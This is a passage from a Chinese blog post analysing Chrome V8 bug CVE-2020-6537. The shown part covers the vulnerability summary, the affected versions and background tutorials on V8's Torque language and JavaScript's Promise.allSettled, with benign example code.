<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2020-6537分析报告 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVE-2020-6537分析报告一、漏洞详情84.0.4147.105 之前的 Google Chrome 中的 V8 类型混淆允许远程攻击者通过精心设计的 HTML 页面在沙盒内执行任意代码。 二、影响范围Google Chrome 84.0.4147.105  之前 三、前置知识TorqueTorque（简称 TQ）是 V8 JavaScript 引擎内部使用的领域特定语言（DSL），专门用">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2020-6537分析报告">
<meta property="og:url" content="http://c0ke.top/2025/07/30/CVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/index.html">
<meta property="og:site_name" content="Daily Study">
<meta property="og:description" content="CVE-2020-6537分析报告一、漏洞详情84.0.4147.105 之前的 Google Chrome 中的 V8 类型混淆允许远程攻击者通过精心设计的 HTML 页面在沙盒内执行任意代码。 二、影响范围Google Chrome 84.0.4147.105  之前 三、前置知识TorqueTorque（简称 TQ）是 V8 JavaScript 引擎内部使用的领域特定语言（DSL），专门用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png">
<meta property="article:published_time" content="2025-07-30T03:04:06.716Z">
<meta property="article:modified_time" content="2025-07-30T03:18:41.255Z">
<meta property="article:author" content="C0KE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://c0ke.top/2025/07/30/CVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2020-6537分析报告',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-07-30 11:18:41'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2020-6537分析报告</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-30T03:04:06.716Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-30T03:18:41.255Z" title="更新于 2025-07-30 11:18:41">2025-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE-2020-6537/">CVE-2020-6537</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2020-6537分析报告"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2020-6537分析报告"><a href="#CVE-2020-6537分析报告" class="headerlink" title="CVE-2020-6537分析报告"></a>CVE-2020-6537分析报告</h1><h2 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h2><p>84.0.4147.105 之前的 Google Chrome 中的 V8 类型混淆允许远程攻击者通过精心设计的 HTML 页面在沙盒内执行任意代码。</p>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Google Chrome 84.0.4147.105  之前</p>
<h2 id="三、前置知识"><a href="#三、前置知识" class="headerlink" title="三、前置知识"></a>三、前置知识</h2><h3 id="Torque"><a href="#Torque" class="headerlink" title="Torque"></a>Torque</h3><p>Torque（简称 TQ）是 V8 JavaScript 引擎内部使用的<strong>领域特定语言</strong>（DSL），专门用于编写 V8 的高性能内置功能。<code>.tq</code> 文件就是包含 Torque 代码的文件。</p>
<p>大多数用Torque编写的源代码都写入到V8存储库 <code>src/builtins</code> 目录下，文件扩展名为 <code>.tq</code> 。V8的堆分配类的Torque定义与它们的C++定义一起出现在 <code>.tq</code> 文件中，其名称与 <code>src/objects</code> 中相应的C文件相同。实际的Torque编译器可以在 <code>src/torque</code> 下找到。Torque 功能的测试在 <code>test/torque</code> 、 <code>test/cctest/torque</code> 和 <code>test/unittests/torque</code> 目录下进行。</p>
<p>为了让您体验一下这种语言，让我们编写一个V8内置程序来打印“Hello World!”为此，我们将在测试用例中添加一个Torque <code>macro</code> ，并从 <code>cctest</code> 测试框架中调用它。</p>
<p>首先打开 <code>test/torque/test-torque.tq</code> 文件，并在末尾添加以下代码（但在最后关闭 <code>&#125;</code> 之前）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">export</span></span><br><span class="line">macro <span class="title class_">PrintHelloWorld</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">  <span class="title class_">Print</span>(<span class="string">&#x27;Hello world!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，打开 <code>test/cctest/torque/test-torque.cc</code> 并添加以下测试用例，该用例使用新的Torque代码来构建代码存根：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">TEST</span>(<span class="params">HelloWorld</span>) &#123;</span><br><span class="line">  <span class="title class_">Isolate</span>* <span class="title function_">isolate</span>(<span class="title class_">CcTest</span>::<span class="title class_">InitIsolateOnce</span>());</span><br><span class="line">  <span class="title class_">CodeAssemblerTester</span> <span class="title function_">asm_tester</span>(isolate, <span class="title class_">JSParameterCount</span>(<span class="number">0</span>));</span><br><span class="line">  <span class="title class_">TestTorqueAssembler</span> <span class="title function_">m</span>(asm_tester.<span class="title function_">state</span>());</span><br><span class="line">  &#123;</span><br><span class="line">    m.<span class="title class_">PrintHelloWorld</span>();</span><br><span class="line">    m.<span class="title class_">Return</span>(m.<span class="title class_">UndefinedConstant</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">FunctionTester</span> <span class="title function_">ft</span>(asm_tester.<span class="title class_">GenerateCode</span>(), <span class="number">0</span>);</span><br><span class="line">  ft.<span class="title class_">Call</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后构建 <code>cctest</code> 可执行文件，最后执行 <code>cctest</code> 测试以打印‘ Hello world ’：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ out/x64.<span class="property">debug</span>/cctest test-torque/<span class="title class_">HelloWorld</span></span><br><span class="line"><span class="title class_">Hello</span> world!</span><br></pre></td></tr></table></figure>

<h4 id="Torque如何生成代码"><a href="#Torque如何生成代码" class="headerlink" title="Torque如何生成代码"></a>Torque如何生成代码</h4><p>Torque编译器不直接创建机器码，而是生成调用V8现有的 <code>CodeStubAssembler</code> 接口的C代码。 <code>CodeStubAssembler</code> 使用TurboFan编译器的后端生成高效的代码。因此，扭矩编译需要多个步骤：</p>
<ol>
<li><code>gn</code> 构建首先运行Torque编译器。它处理所有 <code>*.tq</code> 文件。每个Torque文件 <code>path/to/file.tq</code> 会生成以下文件：</li>
</ol>
<ul>
<li><code>path/to/file-tq-csa.cc</code> 和 <code>path/to/file-tq-csa.h</code> ，包含生成的CSA宏。</li>
<li><code>path/to/file-tq.inc</code> 包含在相应的头文件 <code>path/to/file.h</code> 包含类定义。</li>
<li><code>path/to/file-tq-inl.inc</code> 包含在相应的内联头文件 <code>path/to/file-inl.h</code> ，包含类定义的C访问器。</li>
<li><code>path/to/file-tq.cc</code> ，包含生成的堆验证器、打印机等。</li>
</ul>
<p>   Torque编译器还生成各种其他已知的 <code>.h</code> 文件，这些文件将由V8构建使用。</p>
<ol start="2">
<li><p>然后， <code>gn</code> 构建将从步骤1生成的 <code>-csa.cc</code> 文件编译成 <code>mksnapshot</code> 可执行文件。</p>
</li>
<li><p>当 <code>mksnapshot</code> 运行时，所有V8的内建都被生成并打包到快照文件中，包括那些在Torque中定义的和任何其他使用Torque定义功能的内建。</p>
</li>
<li><p>V8的其余部分已经构建完成。通过链接到V8的快照文件，可以访问所有由torque编写的内置程序。可以像调用其他内置函数一样调用它们。此外， <code>d8</code> 或 <code>chrome</code> 可执行文件还包括直接与类定义相关的生成编译单元。</p>
</li>
</ol>
<p>从图形上看，构建过程是这样的：</p>
<p><img src="/picture%5CCVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%5Cbuild-process-1749619486211-10.svg" alt="build-process"></p>
<h3 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h3><p>Promise对象用于表示一个异步操作的最终完成 (或失败)及其结果值</p>
<p>一个 <strong><code>Promise</code></strong> 是一个代理，它代表一个在创建 promise 时不一定已知的值。它允许你将处理程序与异步操作的最终成功值或失败原因关联起来。这使得异步方法可以像同步方法一样返回值：异步方法不会立即返回最终值，而是返回一个 <em>promise</em>，以便在将来的某个时间点提供该值。</p>
<p>一个 <code>Promise</code> 必然处于以下几种状态之一：</p>
<ul>
<li><em>待定（pending）</em>：初始状态，既没有被兑现，也没有被拒绝。</li>
<li><em>已兑现（fulfilled）</em>：意味着操作成功完成。</li>
<li><em>已拒绝（rejected）</em>：意味着操作失败。</li>
</ul>
<p>一个待定的 Promise <em>最终状态</em>可以是<em>已兑现</em>并返回一个值，或者是<em>已拒绝</em>并返回一个原因（错误）。当其中任意一种情况发生时，通过 Promise 的 <code>then</code> 方法串联的处理程序将被调用。如果绑定相应处理程序时 Promise 已经兑现或拒绝，这处理程序将被立即调用，因此在异步操作完成和绑定处理程序之间不存在竞态条件。</p>
<p>如果一个 Promise 已经被兑现或拒绝，即不再处于待定状态，那么则称之为已<em>敲定（settled）</em>。</p>
<p><img src="/picture%5CCVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%5Cpromises.png" alt="流程图展示了 Promise 状态在 pending、fulfilled 和 rejected 之间如何通过 then() 和 catch() 处理程序进行转换。一个待定的 Promise 可以变成已兑现或已拒绝的状态。如果 Promise 已经兑现，则会执行“on fulfillment”处理程序（即 then() 方法的第一个参数），并继续执行进一步的异步操作。如果 Promise 被拒绝，则会执行错误处理程序，可以将其作为 then() 方法的第二个参数或 catch() 方法的唯一参数来传递。"></p>
<p>你还会听到使用<em>已解决</em>（resolved）这个术语来描述 Promise——这意味着该 Promise 已经敲定（settled），或为了匹配另一个 Promise 的最终状态而被“锁定（lock-in）”，进一步解决或拒绝它都没有影响。原始 Promise 提案中的 <a target="_blank" rel="noopener" href="https://github.com/domenic/promises-unwrapping/blob/master/docs/states-and-fates.md">States and fates</a> 文档包含了更多关于 Promise 术语的细节。在口语中，“已解决”的 Promise 通常等价于“已兑现”的 Promise，但是正如“States and fates”所示，已解决的 Promise 也可以是待定或拒绝的。例如：</p>
<p>jsCopy to Clipboard</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolveOuter</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">resolveOuter</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolveInner</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(resolveInner, <span class="number">1000</span>);</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>此 Promise 在创建时已经被解决（因为 <code>resolveOuter</code> 是同步调用的），但它是用另一个 Promise 解决的，因此在内部 Promise 兑现的 1 秒之后才会<em>被兑现</em>。在实践中，“解决”过程通常是在幕后完成的，不可观察，只有其兑现或拒绝是可观察的。</p>
<p>Promise.allSettled()方法返回一个在所有给定的promise都已经fulfilled或rejected后的promise，并带有一个对象数组，每个对象表示对应的promise结果。</p>
<h3 id="promise-allSettled"><a href="#promise-allSettled" class="headerlink" title="promise.allSettled"></a>promise.allSettled</h3><p><code>Promise.allSettled()</code> 是处理多个 Promise 的实用方法，它会等待所有 Promise 完成（无论成功或失败），并返回每个 Promise 的结果详情。以下是详细说明和具体使用示例：</p>
<p><strong>核心特点</strong></p>
<ol>
<li><strong>不短路</strong>：与 <code>Promise.all()</code> 不同，即使某些 Promise 失败，它也会等待所有 Promise 完成</li>
<li><strong>统一结构</strong>：每个结果都是对象，包含：<ul>
<li><code>status</code>: <code>&quot;fulfilled&quot;</code>（成功）或 <code>&quot;rejected&quot;</code>（失败）</li>
<li><code>value</code>（成功时）或 <code>reason</code>（失败时）</li>
</ul>
</li>
</ol>
<p><strong>基础用法</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> promise3 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(<span class="string">&quot;延迟成功&quot;</span>), <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([promise1, promise2, promise3])</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(results);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">[</span></span><br><span class="line"><span class="comment">  &#123; status: &quot;fulfilled&quot;, value: &quot;成功&quot; &#125;,</span></span><br><span class="line"><span class="comment">  &#123; status: &quot;rejected&quot;, reason: &quot;失败&quot; &#125;,</span></span><br><span class="line"><span class="comment">  &#123; status: &quot;fulfilled&quot;, value: &quot;延迟成功&quot; &#125;</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>结果处理示例</strong></p>
<ol>
<li>分类处理成功&#x2F;失败</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([<span class="title function_">apiCall1</span>(), <span class="title function_">apiCall2</span>(), <span class="title function_">apiCall3</span>()])</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">    results.<span class="title function_">forEach</span>(<span class="function">(<span class="params">result, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (result.<span class="property">status</span> === <span class="string">&quot;fulfilled&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`操作 <span class="subst">$&#123;index+<span class="number">1</span>&#125;</span> 成功:`</span>, result.<span class="property">value</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`操作 <span class="subst">$&#123;index+<span class="number">1</span>&#125;</span> 失败:`</span>, result.<span class="property">reason</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>提取成功结果</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> successfulData = results</span><br><span class="line">  .<span class="title function_">filter</span>(<span class="function"><span class="params">result</span> =&gt;</span> result.<span class="property">status</span> === <span class="string">&quot;fulfilled&quot;</span>)</span><br><span class="line">  .<span class="title function_">map</span>(<span class="function"><span class="params">result</span> =&gt;</span> result.<span class="property">value</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>收集错误日志</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> errors = results</span><br><span class="line">  .<span class="title function_">filter</span>(<span class="function"><span class="params">result</span> =&gt;</span> result.<span class="property">status</span> === <span class="string">&quot;rejected&quot;</span>)</span><br><span class="line">  .<span class="title function_">map</span>(<span class="function"><span class="params">result</span> =&gt;</span> result.<span class="property">reason</span>);</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>对比其他方法</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">行为</th>
<th align="left">适用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Promise.all()</code></td>
<td align="left">任一失败立即拒绝</td>
<td align="left">需要所有操作都成功</td>
</tr>
<tr>
<td align="left"><code>Promise.any()</code></td>
<td align="left">第一个成功即解决</td>
<td align="left">获取首个可用结果</td>
</tr>
<tr>
<td align="left"><code>Promise.race()</code></td>
<td align="left">第一个完成即解决（无论成败）</td>
<td align="left">超时控制</td>
</tr>
<tr>
<td align="left"><strong><code>Promise.allSettled()</code></strong></td>
<td align="left">等待所有完成</td>
<td align="left"><strong>需要完整的结果报告</strong></td>
</tr>
</tbody></table>
<p><strong>实际应用场景</strong></p>
<p>场景1：批量上传文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> uploadResults = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">allSettled</span>(</span><br><span class="line">  files.<span class="title function_">map</span>(<span class="function"><span class="params">file</span> =&gt;</span> <span class="title function_">uploadToServer</span>(file))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成报告</span></span><br><span class="line"><span class="keyword">const</span> report = &#123;</span><br><span class="line">  <span class="attr">succeeded</span>: uploadResults.<span class="title function_">filter</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="property">status</span> === <span class="string">&quot;fulfilled&quot;</span>).<span class="property">length</span>,</span><br><span class="line">  <span class="attr">failed</span>: uploadResults.<span class="title function_">filter</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="property">status</span> === <span class="string">&quot;rejected&quot;</span>).<span class="property">length</span>,</span><br><span class="line">  <span class="attr">errors</span>: uploadResults.<span class="title function_">filter</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="property">status</span> === <span class="string">&quot;rejected&quot;</span>).<span class="title function_">map</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="property">reason</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>场景2：多API数据聚合</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [userData, productData, cartData] = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">allSettled</span>([</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/api/user&quot;</span>),</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/api/products&quot;</span>),</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/api/cart&quot;</span>)</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全访问数据</span></span><br><span class="line"><span class="keyword">const</span> user = userData.<span class="property">status</span> === <span class="string">&quot;fulfilled&quot;</span> ? userData.<span class="property">value</span> : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注意事项</strong></p>
<ol>
<li><strong>浏览器兼容性</strong>：现代浏览器均支持（包括Chrome 76+、Firefox 71+、Safari 13+），Node.js 12.9.0+ 支持</li>
<li><strong>Polyfill</strong>：如需兼容旧环境，可添加以下polyfill：</li>
</ol>
